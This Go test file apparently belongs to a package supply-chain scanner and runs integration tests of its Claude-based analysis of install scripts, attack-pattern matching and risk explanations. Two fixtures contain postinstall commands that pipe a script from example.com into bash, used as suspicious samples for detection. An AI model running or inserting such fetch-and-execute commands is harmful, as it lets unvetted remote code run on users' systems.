package ai

import (
	"context"
	"os"
	"testing"
	"time"

	"github.com/metalstormbass/snyft/pkg/models"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// Test: End-to-end semantic analysis with real API
// Justification: Integration test validates full workflow with Claude API
// Source: Real-world usage pattern
// Methodology: Analyze package with install scripts using real API
// Result: Should return semantic findings with proper structure
func TestSemanticAnalyzer_Integration_RealAPI(t *testing.T) {
	apiKey := os.Getenv("CLAUDE_API_KEY")
	if apiKey == "" {
		apiKey = os.Getenv("ANTHROPIC_API_KEY")
	}
	if apiKey == "" {
		t.Skip("Skipping integration test: CLAUDE_API_KEY not set")
	}

	cfg := DefaultConfig()
	cfg.APIKey = apiKey
	client, err := NewClient(cfg)
	require.NoError(t, err)
	defer client.Close()

	analyzer := NewSemanticAnalyzer(client)
	opts := DefaultAnalyzerOptions()

	// Test with suspicious install script
	scripts := map[string]string{
		"postinstall": `#!/bin/bash
curl -sL https://example.com/script.sh | bash
echo "Installing dependencies..."
npm install -g some-package`,
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	findings, err := analyzer.AnalyzeInstallScripts(ctx, scripts, opts)
	require.NoError(t, err, "Should successfully analyze install scripts")

	// Validate findings structure
	assert.NotNil(t, findings, "Should return findings")
	if len(findings) > 0 {
		for _, finding := range findings {
			assert.NotEmpty(t, finding.Type, "Finding should have type")
			assert.NotEmpty(t, finding.Description, "Finding should have description")
			assert.NotEmpty(t, finding.Severity, "Finding should have severity")
			assert.NotEmpty(t, finding.FilePath, "Finding should have file path")
			assert.True(t, finding.Confidence >= 0 && finding.Confidence <= 1, "Confidence should be 0-1")

			t.Logf("Found: %s - %s (confidence: %.2f)", finding.Type, finding.Description, finding.Confidence)
		}
	}
}

// Test: Attack pattern matching integration
// Justification: Validates attack pattern matching with real Claude API
// Source: Historical attack pattern database
// Methodology: Match high-risk package against known attack patterns
// Result: Should return pattern matches with similarity scores
func TestAttackMatcher_Integration_RealAPI(t *testing.T) {
	apiKey := os.Getenv("CLAUDE_API_KEY")
	if apiKey == "" {
		apiKey = os.Getenv("ANTHROPIC_API_KEY")
	}
	if apiKey == "" {
		t.Skip("Skipping integration test: CLAUDE_API_KEY not set")
	}

	cfg := DefaultConfig()
	cfg.APIKey = apiKey
	client, err := NewClient(cfg)
	require.NoError(t, err)
	defer client.Close()

	// Create high-risk analysis result
	result := models.AnalysisResult{
		RiskLevel: "HIGH",
		RiskScore: 90,
		RiskFactors: []string{
			"Single maintainer with full control",
			"No 2FA enforcement",
			"Malicious install scripts detected",
		},
		SourceCodeAvailable: true,
		Metadata: models.PackageMetadata{
			Maintainers:       []string{"single-maintainer"},
			HasInstallScripts: true,
			HasCI:             false,
		},
		Findings: []models.Finding{
			{
				Severity:    "CRITICAL",
				Category:    "Install Execution",
				Description: "Suspicious postinstall script with network requests",
			},
		},
		SupplyChainScore: &models.SupplyChainScore{
			TotalScore: 14,
			RiskLevel:  "HIGH",
		},
	}

	req := AttackMatchRequest{
		PackageName:    "suspicious-test-package",
		Ecosystem:      models.EcosystemNPM,
		AnalysisResult: result,
		Threshold:      0.4, // Lower threshold for testing
	}

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	matches, err := MatchAgainstKnownAttacks(ctx, client, req)
	require.NoError(t, err, "Should successfully match attack patterns")

	// Validate matches
	if len(matches) > 0 {
		for _, match := range matches {
			assert.NotEmpty(t, match.PatternName, "Match should have pattern name")
			assert.True(t, match.Confidence >= 0 && match.Confidence <= 1, "Confidence should be 0-1")
			assert.NotEmpty(t, match.Severity, "Match should have severity")
			assert.NotEmpty(t, match.Description, "Match should have description")
			assert.NotEmpty(t, match.AcademicSource, "Match should have academic source")

			t.Logf("Pattern match: %s (confidence: %.2f)",
				match.PatternName, match.Confidence)
		}
	} else {
		t.Log("No attack pattern matches found (threshold may be too high)")
	}
}

// Test: Executive explanation generation integration
// Justification: Validates executive explanation with real Claude API
// Source: Stakeholder communication requirements
// Methodology: Generate explanation for high-risk package
// Result: Should return structured explanation with all sections
func TestExplainer_Integration_RealAPI(t *testing.T) {
	apiKey := os.Getenv("CLAUDE_API_KEY")
	if apiKey == "" {
		apiKey = os.Getenv("ANTHROPIC_API_KEY")
	}
	if apiKey == "" {
		t.Skip("Skipping integration test: CLAUDE_API_KEY not set")
	}

	cfg := DefaultConfig()
	cfg.APIKey = apiKey
	client, err := NewClient(cfg)
	require.NoError(t, err)
	defer client.Close()

	config := &ExplainerConfig{
		Client:         client,
		TargetAudience: "executive",
		IncludeAttacks: true,
		MaxTokens:      1500,
		Temperature:    0.5,
	}

	explainer := NewExplainer(config)

	result := models.AnalysisResult{
		RiskLevel: "HIGH",
		RiskScore: 85,
		RiskFactors: []string{
			"Single maintainer (account takeover risk)",
			"Dangerous install scripts detected",
			"No SLSA attestation or Sigstore signature",
		},
		Findings: []models.Finding{
			{
				Severity:    "HIGH",
				Category:    "Publisher Control",
				Description: "Single maintainer - single point of compromise",
				Evidence:    "Only 1 maintainer found in npm registry",
			},
		},
		SupplyChainScore: &models.SupplyChainScore{
			TotalScore: 14,
			RiskLevel:  "HIGH",
		},
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	explainerResult, err := explainer.ExplainRisk(ctx, "suspicious-package", models.EcosystemNPM, result)
	require.NoError(t, err, "Should successfully generate executive explanation")

	// Validate explanation structure
	require.NotNil(t, explainerResult.Explanation, "Should have explanation")
	assert.NotEmpty(t, explainerResult.Explanation.Summary, "Should have summary")
	assert.NotEmpty(t, explainerResult.Explanation.RecommendedAction, "Should have recommendation")
	assert.True(t, explainerResult.Explanation.Confidence > 0, "Should have confidence > 0")

	t.Logf("Summary: %s", explainerResult.Explanation.Summary)
	t.Logf("Recommendation: %s", explainerResult.Explanation.RecommendedAction)
	t.Logf("Confidence: %.2f", explainerResult.Explanation.Confidence)
}

// Test: Quick summary generation
// Justification: Quick summaries should be concise (2-3 sentences)
// Source: Executive briefing best practices
// Methodology: Generate quick summary with real API
// Result: Should return brief summary with clear recommendation
func TestExplainer_QuickSummary_Integration(t *testing.T) {
	apiKey := os.Getenv("CLAUDE_API_KEY")
	if apiKey == "" {
		apiKey = os.Getenv("ANTHROPIC_API_KEY")
	}
	if apiKey == "" {
		t.Skip("Skipping integration test: CLAUDE_API_KEY not set")
	}

	cfg := DefaultConfig()
	cfg.APIKey = apiKey
	client, err := NewClient(cfg)
	require.NoError(t, err)
	defer client.Close()

	config := &ExplainerConfig{
		Client: client,
	}
	explainer := NewExplainer(config)

	result := models.AnalysisResult{
		RiskLevel: "MEDIUM",
		RiskScore: 55,
		Findings: []models.Finding{
			{Severity: "MEDIUM", Description: "No branch protection"},
		},
	}

	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()

	summary, err := explainer.GenerateQuickSummary(ctx, "test-package", result)
	require.NoError(t, err, "Should generate quick summary")

	assert.NotEmpty(t, summary, "Summary should not be empty")

	// Quick summary should be concise
	sentences := countSentences(summary)
	if sentences > 5 {
		t.Logf("Warning: Quick summary has %d sentences (expected 2-4)", sentences)
	}

	t.Logf("Quick summary: %s", summary)
}

// Test: Batch explanation processing
// Justification: Efficient processing of multiple packages
// Source: Bulk processing requirements
// Methodology: Process multiple packages in batch
// Result: Should return results for all packages
func TestExplainer_BatchExplain_Integration(t *testing.T) {
	apiKey := os.Getenv("CLAUDE_API_KEY")
	if apiKey == "" {
		apiKey = os.Getenv("ANTHROPIC_API_KEY")
	}
	if apiKey == "" {
		t.Skip("Skipping integration test: CLAUDE_API_KEY not set")
	}

	cfg := DefaultConfig()
	cfg.APIKey = apiKey
	client, err := NewClient(cfg)
	require.NoError(t, err)
	defer client.Close()

	config := &ExplainerConfig{
		Client: client,
	}
	explainer := NewExplainer(config)

	packages := []string{"pkg-a", "pkg-b"}
	ecosystems := []models.Ecosystem{models.EcosystemNPM, models.EcosystemPyPI}
	results := []models.AnalysisResult{
		{RiskLevel: "LOW", RiskScore: 20},
		{RiskLevel: "HIGH", RiskScore: 85},
	}

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	batchResults, err := explainer.BatchExplain(ctx, packages, ecosystems, results)
	require.NoError(t, err, "Should successfully batch explain")

	assert.Equal(t, len(packages), len(batchResults), "Should return result for each package")

	for i, result := range batchResults {
		assert.NotNil(t, result.Explanation, "Package %d should have explanation", i)
		t.Logf("Package %s: %s", packages[i], result.Explanation.Summary)
	}
}

// Test: Full package analysis with attack patterns
// Justification: End-to-end test of complete AI analysis pipeline
// Source: Integration testing best practices
// Methodology: Analyze package with all AI features enabled
// Result: Should return comprehensive analysis with all AI insights
func TestSemanticAnalyzer_AnalyzeWithAttackPatterns_Integration(t *testing.T) {
	apiKey := os.Getenv("CLAUDE_API_KEY")
	if apiKey == "" {
		apiKey = os.Getenv("ANTHROPIC_API_KEY")
	}
	if apiKey == "" {
		t.Skip("Skipping integration test: CLAUDE_API_KEY not set")
	}

	cfg := DefaultConfig()
	cfg.APIKey = apiKey
	client, err := NewClient(cfg)
	require.NoError(t, err)
	defer client.Close()

	analyzer := NewSemanticAnalyzer(client)
	opts := DefaultAnalyzerOptions()

	pkg := &models.AnalysisResult{
		Dependency: models.Dependency{
			Name:      "test-package",
			Version:   "1.0.0",
			Ecosystem: models.EcosystemNPM,
		},
		RiskLevel: "HIGH",
		RiskScore: 85,
		Metadata: models.PackageMetadata{
			InstallScripts: map[string]string{
				"postinstall": "curl http://example.com | bash",
			},
			HasInstallScripts: true,
			Maintainers:       []string{"single-maintainer"},
		},
		Findings: []models.Finding{
			{
				Severity:    "HIGH",
				Category:    "Install Execution",
				Description: "Suspicious install script",
			},
		},
		SupplyChainScore: &models.SupplyChainScore{
			TotalScore: 14,
			RiskLevel:  "HIGH",
		},
	}

	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()

	enrichedResult, err := analyzer.AnalyzeWithAttackPatterns(ctx, pkg, opts)
	require.NoError(t, err, "Should successfully analyze with attack patterns")

	// Validate enriched result
	assert.NotNil(t, enrichedResult, "Should return enriched result")
	if enrichedResult != nil {
		t.Logf("Semantic findings: %d", len(enrichedResult.SemanticFindings))
		t.Logf("Attack pattern matches: %d", len(enrichedResult.AttackPatterns))

		// Validate semantic findings
		for _, finding := range enrichedResult.SemanticFindings {
			assert.NotEmpty(t, finding.Type, "Finding should have type")
			assert.NotEmpty(t, finding.Severity, "Finding should have severity")
		}

		// Validate attack pattern matches
		for _, match := range enrichedResult.AttackPatterns {
			assert.NotEmpty(t, match.PatternName, "Match should have pattern name")
			assert.True(t, match.Confidence >= 0 && match.Confidence <= 1, "Confidence should be 0-1")
		}
	}
}

